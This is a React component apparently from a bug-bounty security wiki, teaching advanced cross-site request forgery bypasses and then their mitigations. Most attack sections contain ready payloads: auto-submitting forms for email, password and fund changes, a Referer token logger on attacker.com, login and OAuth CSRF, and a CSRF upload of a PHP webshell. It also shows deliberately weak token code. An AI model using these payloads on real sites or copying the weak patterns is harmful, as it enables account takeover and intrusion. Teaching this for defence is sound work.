/**
 * CSRF ADVANCED
 * Bypass CSRF protection with advanced techniques (English version)
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function CSRFAdvancedContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="CSRF Advanced - Bypass All Protections">
        <Paragraph>
          <Strong>Cross-Site Request Forgery (CSRF)</Strong> allows forcing an authenticated victim 
          to execute unauthorized actions. Advanced techniques bypass tokens, SameSite cookies, 
          and custom headers.
        </Paragraph>

        <AlertDanger title="Advanced CSRF Impact">
          <ul className="mt-2 space-y-1">
            <ListItem>💰 Unauthorized fund transfers</ListItem>
            <ListItem>🔑 Email/password change → Account takeover</ListItem>
            <ListItem>👤 Admin user creation</ListItem>
            <ListItem>🗑️ Data deletion</ListItem>
            <ListItem>⚙️ Critical configuration modification</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="basic-csrf" title="1. Basic CSRF - No Protection">
        <CodeBlock
          language="php"
          title="❌ VULNERABLE - No CSRF token"
          code={`<?php
session_start();

// Vulnerable endpoint
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    
    // ❌ No CSRF token validation
    // Only checks if user is authenticated
    if (isset($_SESSION['user_id'])) {
        updateEmail($_SESSION['user_id'], $email);
        echo "Email updated";
    }
}
?>`}
        />

        <CodeBlock
          language="html"
          title="Exploit - Page on attacker.com"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Win a Free iPhone! 🎁</h1>
  
  <!-- Auto-submit form on authenticated victim -->
  <form id="csrf" action="https://victim.com/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  
  <script>
    // Auto-submit when page loads
    document.getElementById('csrf').submit();
  </script>
</body>
</html>

<!-- Victim visits attacker.com while logged into victim.com
Result: Email changed to attacker@evil.com → Account takeover ✓
-->`}
        />
      </Section>

      <Section id="token-bypass" title="2. CSRF Token Bypass">
        <Subsection title="Predictable Token">
          <CodeBlock
            language="php"
            title="❌ VULNERABLE - Timestamp-based token"
            code={`<?php
// Generate CSRF token
function generateCSRFToken() {
    // ❌ VULNERABLE - Based on timestamp
    $token = md5(time());
    $_SESSION['csrf_token'] = $token;
    return $token;
}

// Validate token
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Invalid CSRF token');
}

// Attacker can:
// 1. Guess timestamp (~same second)
// 2. Generate token with md5(time())
// 3. Use in attack → Bypass ✓`}
          />
        </Subsection>

        <Subsection title="Token Leakage via Referer">
          <CodeBlock
            language="html"
            title="Token exposed in URL"
            code={`<!-- Application puts token in URL (BAD): -->
<form action="/transfer?csrf=abc123def456" method="POST">
  <input name="amount" />
  <button>Transfer</button>
</form>

<!-- If victim clicks external link from this page: -->
<a href="https://attacker.com">Click here</a>

<!-- Request to attacker.com includes Referer:
GET / HTTP/1.1
Host: attacker.com
Referer: https://victim.com/transfer?csrf=abc123def456

Attacker captures token from Referer header ✓
-->`}
          />

          <CodeBlock
            language="html"
            title="Exploit - Steal token from Referer"
            code={`<!-- Attacker's page with invisible image -->
<img src="https://attacker.com/log-referer.php" style="display:none" />

<!-- log-referer.php: -->
<?php
$referer = $_SERVER['HTTP_REFERER'];
// Extract token from referer
preg_match('/csrf=([a-f0-9]+)/', $referer, $matches);
$token = $matches[1];

// Save stolen token
file_put_contents('stolen_tokens.txt', $token . "\\n", FILE_APPEND);
?>

<!-- Now attacker has valid token for CSRF ✓ -->`}
          />
        </Subsection>

        <Subsection title="Token Not Bound to Session">
          <CodeBlock
            language="php"
            title="❌ VULNERABLE - Global token not tied to user"
            code={`<?php
// Generate shared token
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Validate token
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Invalid CSRF token');
}

// ❌ PROBLEM:
// Attacker can:
// 1. Create own account on victim.com
// 2. Get their own CSRF token
// 3. Use that token in attack against another victim
// 4. If token NOT bound to session ID → Bypass ✓`}
          />
        </Subsection>

        <Subsection title="Reusable Token">
          <CodeBlock
            language="php"
            title="❌ VULNERABLE - Token not invalidated after use"
            code={`<?php
// Token generated once
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Validate but DON'T regenerate
if ($_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // Execute action
    updateEmail($_POST['email']);
    
    // ❌ Token NOT regenerated - Reusable
}

// Attacker can:
// 1. Obtain valid token (leak, XSS, etc.)
// 2. Use same token multiple times
// 3. CSRF works indefinitely ✓`}
          />
        </Subsection>
      </Section>

      <Section id="samesite-bypass" title="3. SameSite Cookie Bypass">
        <Paragraph>
          <InlineCode>SameSite</InlineCode> cookie attribute prevents sending cookies in 
          cross-site requests. But it has multiple bypasses.
        </Paragraph>

        <Subsection title="SameSite=Lax with GET Requests">
          <CodeBlock
            language="javascript"
            title="SameSite=Lax allows GET with top-level navigation"
            code={`// Cookie configured:
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax'  // ← Lax allows top-level GET
});

// Bypass:
// If vulnerable endpoint uses GET for actions:
// GET /delete-account?confirm=yes

// Attacker can:
<a href="https://victim.com/delete-account?confirm=yes">
  Click for Prize!
</a>

// SameSite=Lax allows cookies in GET navigation ✓
// Account deleted ✓`}
          />

          <AlertWarning>
            <Strong>SameSite=Lax</Strong> sends cookies in: top-level GET navigation, 
            <InlineCode>&lt;a&gt;</InlineCode> links, prerender. NOT in cross-site POST.
          </AlertWarning>
        </Subsection>

        <Subsection title="Chrome SameSite=Lax 2-Minute Bypass">
          <CodeBlock
            language="html"
            title="SameSite=Lax bypass in first 2 minutes"
            code={`<!-- Chrome BUG (patched in recent versions):
SameSite=Lax cookies are sent in POST during first 2 minutes
after being set
-->

<form id="csrf" action="https://victim.com/transfer" method="POST">
  <input name="amount" value="10000" />
  <input name="to" value="attacker" />
</form>

<script>
  // If victim just logged in (< 2 min):
  // Session cookie with SameSite=Lax is STILL sent in POST
  document.getElementById('csrf').submit();
</script>

<!-- Works if:
1. Victim logs in
2. Immediately visits attacker's page
3. POST CSRF within 2 minutes → Cookie sent ✓
-->`}
          />
        </Subsection>

        <Subsection title="Subdomain Bypass of SameSite">
          <CodeBlock
            language="html"
            title="If attacker controls subdomain"
            code={`<!-- If attacker controls subdomain (e.g., subdomain takeover):
https://evil.victim.com

Cookies with Domain=.victim.com are sent from subdomains
SameSite does NOT prevent requests from same site (evil.victim.com → api.victim.com)
-->

<!-- On evil.victim.com: -->
<form action="https://api.victim.com/transfer" method="POST">
  <input name="amount" value="10000" />
</form>

<script>
  // SameSite=Lax allows same-site requests
  // evil.victim.com is same-site with api.victim.com ✓
  document.forms[0].submit();
</script>

<!-- Cookie sent → CSRF successful ✓ -->`}
          />
        </Subsection>

        <Subsection title="WebSocket Bypass of SameSite">
          <CodeBlock
            language="html"
            title="WebSockets don't respect SameSite"
            code={`<!-- WebSocket connections NOT affected by SameSite -->

<script>
  // From attacker.com, connect to victim.com WebSocket
  const ws = new WebSocket('wss://victim.com/ws');
  
  ws.onopen = () => {
    // Cookies are sent in WebSocket handshake
    // Regardless of SameSite ✓
    
    ws.send(JSON.stringify({
      action: 'transfer',
      amount: 10000,
      to: 'attacker'
    }));
  };
</script>

<!-- If victim.com uses WebSocket without CSRF protection
Attack works even with SameSite=Strict ✓
-->`}
          />
        </Subsection>
      </Section>

      <Section id="custom-header-bypass" title="4. Custom Header Bypass">
        <Subsection title="Header Validation Bypass with Flash">
          <CodeBlock
            language="actionscript"
            title="Flash bypass (legacy but still relevant)"
            code={`// Application verifies custom header:
// X-Requested-With: XMLHttpRequest

// Flash can set arbitrary headers
var request:URLRequest = new URLRequest("https://victim.com/api");
request.method = URLRequestMethod.POST;

// Set custom header
var headers:Array = [];
headers.push(new URLRequestHeader("X-Requested-With", "XMLHttpRequest"));
request.requestHeaders = headers;

var loader:URLLoader = new URLLoader();
loader.load(request);

// Flash bypasses CORS and can set headers ✓
// CSRF successful ✓`}
          />
        </Subsection>

        <Subsection title="HTTP Method Override">
          <CodeBlock
            language="html"
            title="Bypass using X-HTTP-Method-Override"
            code={`<!-- Some frameworks allow method override:
POST with header: X-HTTP-Method-Override: DELETE
→ Treated as DELETE request
-->

<!-- If application checks CSRF only on POST but not DELETE: -->

<form action="https://victim.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE" />
</form>

<!-- Frameworks like Laravel process _method parameter
POST with _method=DELETE → Treated as DELETE
If CSRF validation only on POST → Bypass ✓
-->`}
          />
        </Subsection>
      </Section>

      <Section id="login-csrf" title="5. Login CSRF - Force Login with Attacker's Account">
        <CodeBlock
          language="html"
          title="Login CSRF attack"
          code={`<!-- Attacker forces victim to log in with attacker's account -->

<form id="loginCSRF" action="https://victim.com/login" method="POST">
  <input type="hidden" name="username" value="attacker@evil.com" />
  <input type="hidden" name="password" value="attackerPassword123" />
</form>

<script>
  document.getElementById('loginCSRF').submit();
</script>

<!-- Result:
1. Victim is logged in with attacker's account
2. Victim uses application normally
3. Enters sensitive data, makes transactions
4. Attacker logs in with same account
5. Sees all victim's data/transactions ✓

Real cases:
- YouTube login CSRF (2008)
- Netflix login CSRF (2006)
-->`}
        />

        <CodeBlock
          language="html"
          title="OAuth Login CSRF - Link Account Attack"
          code={`<!-- Attacker starts OAuth flow with their account:
1. Visits victim.com/oauth/google
2. Authorizes with their Google account
3. Captures OAuth callback URL:
   https://victim.com/oauth/callback?code=ATTACKER_CODE&state=xyz

4. Doesn't complete login
-->

<!-- Then forces victim to complete login: -->
<script>
  // Redirect to callback with attacker's code
  window.location = 'https://victim.com/oauth/callback?code=ATTACKER_CODE&state=xyz';
</script>

<!-- Result:
1. Victim completes OAuth login
2. ATTACKER's Google account is linked to VICTIM's profile
3. Attacker can log in with their Google
4. Accesses victim's account ✓
-->`}
        />
      </Section>

      <Section id="json-csrf" title="6. CSRF with Content-Type application/json">
        <CodeBlock
          language="html"
          title="JSON CSRF protection bypass"
          code={`<!-- Application only accepts JSON:
Content-Type: application/json
{"amount": 1000, "to": "attacker"}
-->

<!-- Normal form CANNOT send JSON (only form-urlencoded)
But Flash can: -->

<object>
  <param name="movie" value="csrf.swf" />
</object>

<!-- csrf.swf (ActionScript): -->
var request:URLRequest = new URLRequest("https://victim.com/api/transfer");
request.method = URLRequestMethod.POST;
request.contentType = "application/json";
request.data = '{"amount":10000,"to":"attacker"}';

var loader:URLLoader = new URLLoader();
loader.load(request);

<!-- Flash can set Content-Type: application/json
Bypasses JSON-only endpoint ✓
-->`}
        />

        <CodeBlock
          language="html"
          title="Modern alternative - Form with text/plain"
          code={`<!-- Trick: Send JSON-like data with Content-Type: text/plain
Some parsers accept JSON even if Content-Type is not application/json
-->

<form action="https://victim.com/api/transfer" method="POST" enctype="text/plain">
  <input name='{"amount":10000,"to":"attacker","ignore":"' value='"}' />
</form>

<!-- Resulting request:
Content-Type: text/plain
Body: {"amount":10000,"to":"attacker","ignore":"="}

If backend parses as JSON (ignoring Content-Type)
→ CSRF successful ✓
-->`}
        />
      </Section>

      <Section id="csrf-gadgets" title="7. CSRF Gadgets - Exploit Legitimate Functionality">
        <Subsection title="File Upload CSRF">
          <CodeBlock
            language="html"
            title="Upload webshell via CSRF"
            code={`<form id="uploadCSRF" action="https://victim.com/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="file" value="<?php system($_GET['cmd']); ?>" />
  <input type="hidden" name="filename" value="shell.php" />
</form>

<script>
  // Auto-submit malicious upload
  document.getElementById('uploadCSRF').submit();
</script>

<!-- If upload has NO CSRF protection:
1. Webshell uploaded
2. Access: https://victim.com/uploads/shell.php?cmd=id
3. RCE ✓
-->`}
          />
        </Subsection>

        <Subsection title="Password Change CSRF">
          <CodeBlock
            language="html"
            title="Account takeover via password change"
            code={`<form id="pwdCSRF" action="https://victim.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123" />
  <input type="hidden" name="confirm_password" value="hacked123" />
  <!-- Many apps DON'T require current password on change -->
</form>

<script>
  document.getElementById('pwdCSRF').submit();
</script>

<!-- Result:
1. Victim's password changed to "hacked123"
2. Attacker logs in with new password
3. Complete account takeover ✓
-->`}
          />
        </Subsection>

        <Subsection title="Email Change + Password Reset = Account Takeover">
          <CodeBlock
            language="html"
            title="Combo attack - Change email and reset password"
            code={`<!-- Step 1: CSRF to change email -->
<form id="emailCSRF" action="https://victim.com/update-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>

<script>
  // Change email
  document.getElementById('emailCSRF').submit();
  
  // Wait 2 seconds
  setTimeout(() => {
    // Step 2: Request password reset
    fetch('https://victim.com/forgot-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  }, 2000);
</script>

<!-- Result:
1. Victim's email changed to attacker@evil.com
2. Password reset link sent to attacker@evil.com
3. Attacker receives link, resets password
4. Account takeover ✓
-->`}
          />
        </Subsection>
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Complete Defense Against CSRF">
          Implement multiple layers of protection.
        </AlertDanger>

        <Subsection title="1. Proper CSRF Token">
          <CodeBlock
            language="php"
            title="✅ SECURE - Strong cryptographic token"
            code={`<?php
session_start();

// ✅ Generate secure token
function generateCSRFToken() {
    // Cryptographically secure random
    $token = bin2hex(random_bytes(32));
    
    // Associate with specific session
    $_SESSION['csrf_token'] = $token;
    $_SESSION['csrf_token_time'] = time();
    
    return $token;
}

// ✅ Validate token
function validateCSRFToken($token) {
    // Check it exists
    if (!isset($_SESSION['csrf_token'])) {
        return false;
    }
    
    // ✅ Timing-safe comparison
    if (!hash_equals($_SESSION['csrf_token'], $token)) {
        return false;
    }
    
    // ✅ Check not expired (15 min)
    $age = time() - $_SESSION['csrf_token_time'];
    if ($age > 900) {
        return false;
    }
    
    // ✅ Regenerate token after use
    unset($_SESSION['csrf_token']);
    generateCSRFToken();
    
    return true;
}

// On every POST request:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!validateCSRFToken($_POST['csrf_token'])) {
        http_response_code(403);
        die('Invalid CSRF token');
    }
    
    // Process request
}
?>`}
          />
        </Subsection>

        <Subsection title="2. SameSite=Strict + Double Submit Cookie">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Defense in depth"
            code={`// Set cookies with SameSite=Strict
res.cookie('session', sessionToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // ✅ Strict - NO send in cross-site
  maxAge: 3600000
});

// ✅ Double Submit Cookie pattern
const csrfToken = crypto.randomBytes(32).toString('hex');

// Cookie with CSRF token (NOT httpOnly for JS access)
res.cookie('csrf_token', csrfToken, {
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});

// Also send in response body
res.json({ csrfToken });

// ✅ Client includes token in header
// fetch('/api/transfer', {
//   method: 'POST',
//   headers: {
//     'X-CSRF-Token': document.cookie.match(/csrf_token=([^;]+)/)[1]
//   },
//   body: JSON.stringify({ amount: 100 })
// });

// ✅ Server verifies cookie and header match
app.post('/api/*', (req, res, next) => {
  const cookieToken = req.cookies.csrf_token;
  const headerToken = req.headers['x-csrf-token'];
  
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).send('CSRF validation failed');
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="3. Verify Origin/Referer Headers">
          <CodeBlock
            language="javascript"
            title="✅ Validate request origin"
            code={`app.use((req, res, next) => {
  // Only for state-changing requests
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const origin = req.headers.origin || req.headers.referer;
    
    if (!origin) {
      return res.status(403).send('Missing origin header');
    }
    
    // ✅ Verify Origin is our domain
    const allowedOrigins = [
      'https://victim.com',
      'https://app.victim.com'
    ];
    
    try {
      const originURL = new URL(origin);
      const originHost = \`\${originURL.protocol}//\${originURL.hostname}\`;
      
      if (!allowedOrigins.includes(originHost)) {
        return res.status(403).send('Invalid origin');
      }
    } catch {
      return res.status(403).send('Invalid origin format');
    }
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="4. Re-authentication for Critical Actions">
          <CodeBlock
            language="html"
            title="✅ Request password for critical changes"
            code={`<!-- For actions like:
- Change password
- Change email
- Transfer funds
- Delete account
-->

<form action="/change-password" method="POST">
  <!-- ✅ Require current password -->
  <input type="password" name="current_password" required />
  <input type="password" name="new_password" required />
  <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>" />
  <button>Change Password</button>
</form>

<!-- Backend: -->
<?php
// ✅ Verify current password
if (!password_verify($_POST['current_password'], $user['password'])) {
    die('Invalid current password');
}

// Continue with change
?>`}
          />
        </Subsection>

        <Subsection title="5. NO GET for State-Changing Actions">
          <CodeBlock
            language="javascript"
            title="✅ Only GET for reading, POST/PUT/DELETE for changes"
            code={`// ❌ NEVER:
app.get('/delete-account', (req, res) => {
  deleteAccount(req.session.userId);
});

// ✅ CORRECT:
app.post('/delete-account', csrfProtection, (req, res) => {
  deleteAccount(req.session.userId);
});

// ✅ Principle:
// GET → Idempotent, no side effects
// POST/PUT/DELETE → State-changing, CSRF protected`}
          />
        </Subsection>

        <Subsection title="6. Custom Header + Preflight">
          <CodeBlock
            language="javascript"
            title="✅ Force CORS preflight"
            code={`// Client always sends custom header
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'  // ✅ Forces preflight
  },
  body: JSON.stringify({ amount: 100 })
});

// Server verifies header
app.post('/api/*', (req, res, next) => {
  // ✅ Require custom header
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).send('Invalid request');
  }
  
  next();
});

// ✅ Simple form CANNOT set custom headers
// → CSRF blocked
// ✅ Preflight OPTIONS verifies CORS correctly`}
          />
        </Subsection>

        <Subsection title="7. Framework CSRF Protection">
          <CodeBlock
            language="javascript"
            title="✅ Use framework protection"
            code={`// Express.js with csurf middleware
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply to all routes
app.use(csrfProtection);

// Generate token
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Automatically validate on POST
app.post('/transfer', (req, res) => {
  // csurf middleware already validated token
  // If we get here → valid token ✓
  
  processTransfer(req.body);
});

// Django (automatic):
# {% csrf_token %} in templates

// Rails (automatic):
# protect_from_forgery with: :exception`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: WebSocket Hijacking</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/websocket-hijacking`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Exploit WebSockets without authentication</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
